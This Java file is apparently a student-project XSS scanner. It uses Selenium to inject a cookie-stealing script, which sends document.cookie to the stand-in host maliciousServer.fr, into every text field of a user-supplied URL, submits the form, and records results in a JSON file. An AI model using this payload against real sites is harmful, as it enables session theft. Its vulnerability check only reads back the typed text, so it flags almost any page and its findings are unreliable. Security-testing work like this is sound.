package fr.isep.projetseculogiciel;

import io.github.bonigarcia.wdm.WebDriverManager;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import com.google.gson.*;
import com.google.gson.stream.JsonReader;

import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

public class F3Controller {

    private WebDriver driver;
    private static final String FILENAME = "security_failures.json";
    private JsonArray securityFailures;

    public F3Controller(String url) {
        this.securityFailures = readJsonFromFile(FILENAME);
        WebDriverManager.chromedriver().setup();
        ChromeOptions options = new ChromeOptions();
        // options.addArguments("--headless");
        this.driver = new ChromeDriver(options);

        try {
            driver.get(url);
            performXss();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            driver.quit();
            writeJsonToFile(securityFailures, FILENAME);
        }
    }

    public void performXss() {
        try {
            List<WebElement> textInputs = driver.findElements(By.cssSelector("input[type='text'], input[type='password'], textarea"));
            String endpointUrl = "https://www.maliciousServer.fr";
            boolean isVulnerable = false;

            for (WebElement input : textInputs) {
                input.sendKeys("<script>document.write('<img src=\"" + endpointUrl + "?cookie=' + document.cookie + '\"/>');</script>");
                Thread.sleep(1000);

                if (input.getAttribute("value").contains("<script>")) {
                    isVulnerable = true;
                }
            }

            if (isVulnerable) {
                addResultToJSON("XSS", driver.getCurrentUrl(), "High");
            }

            WebElement form = driver.findElement(By.cssSelector("form"));
            form.submit();
            Thread.sleep(1000);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void addResultToJSON(String failureType, String location, String severity) {
        for (JsonElement element : securityFailures) {
            JsonObject obj = element.getAsJsonObject();
            if (obj.get("security_failure_location").getAsString().equals(location)) {
                return;
            }
        }

        JsonObject result = new JsonObject();
        result.addProperty("security_failure_type", failureType);
        result.addProperty("security_failure_location", location);
        result.addProperty("security_failure_severity", severity);

        securityFailures.add(result);
    }

    private JsonArray readJsonFromFile(String filename) {
        JsonArray jsonArray = new JsonArray();
        if (Files.exists(Paths.get(filename))) {
            try (JsonReader reader = new JsonReader(new FileReader(filename))) {
                JsonElement fileContent = JsonParser.parseReader(reader);
                if (fileContent != null && fileContent.isJsonArray()) {
                    jsonArray = fileContent.getAsJsonArray();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return jsonArray;
    }

    private void writeJsonToFile(JsonArray data, String filename) {
        try (FileWriter file = new FileWriter(filename, false)) {
            Gson gson = new Gson();
            String json = gson.toJson(data);
            file.write(json);
            System.out.println("Successfully written to " + filename);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        if (args.length != 1) {
            System.out.println("Enter a parameter");
            return;
        }

        String baseUrl = args[0];
        new F3Controller(baseUrl);
    }
}
